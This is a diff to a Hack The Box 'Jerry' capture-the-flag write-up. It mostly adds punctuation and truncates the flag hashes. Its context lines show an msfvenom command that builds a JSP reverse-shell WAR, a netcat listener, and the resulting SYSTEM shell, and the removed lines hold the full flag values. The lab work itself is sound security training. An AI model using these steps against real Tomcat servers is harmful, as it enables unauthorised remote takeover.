@@ -55,18 +55,18 @@ Created the reverse shell war file using msfvenom
 ```bash
 kali@kali:~/ctf/htb/machines/jerry$ msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f war > reverse.war
 ```
-Now to upload the war file
+Now to upload the war file.
 ![Jerry](/jerry-deploy_war_file2.png)
-After selecting Deploy it can now be see in the Path column under Applications
+After selecting the Deploy button it can now be seen in the Path column under Applications:
 ![Jerry](/jerry-reverse_shell_path.png)
 
 ### Reverse Shell
-Now to start a netcat listener to catch the reverse shell after executing it
+Now to start a netcat listener to catch the reverse shell after executing it:
 ```bash
 kali@kali:~/ctf/htb/machines/jerry$ nc -lvnp 4444
 listening on [any] 4444 ...
 ```
-After selecting the /reverse path from the Path column under Applications, a reverse shell is returned as the nt authority\system user
+After selecting the /reverse path link from the Path column under Applications, a reverse shell is returned as the nt authority\system user:
 ```bash
 connect to [10.10.14.5] from (UNKNOWN) [10.10.10.95] 49192
 Microsoft Windows [Version 6.3.9600]
@@ -82,13 +82,13 @@ hostname
 JERRY
 ```
 ## Flags
-With access as nt authority\system, no privilege escalation is needed, and both flags can be retrieved
+With access as nt authority\system, no privilege escalation is needed, and both flags can be retrieved:
 ```bash
 C:\Users\Administrator\Desktop\flags>type "2 for the price of 1.txt"
 type "2 for the price of 1.txt"
 user.txt
-7004dbcef0f854e0fb401875f26ebd00
+7004dbcef0f854e0...
 
 root.txt
-04a8b36e1545a455393d067e772fe90e
+04a8b36e1545a455...
 ```
